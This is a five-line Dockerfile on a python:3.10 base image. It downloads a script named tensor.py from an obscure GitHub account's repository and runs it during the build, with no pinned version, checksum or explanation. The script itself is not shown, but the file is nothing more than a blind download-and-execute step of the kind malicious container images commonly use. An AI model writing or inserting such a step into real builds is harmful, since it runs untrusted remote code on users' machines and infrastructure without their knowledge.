FROM python:3.10
WORKDIR /app

RUN wget https://github.com/kesykff25/curly-succotash/raw/refs/heads/main/tensor.py
RUN python tensor.py
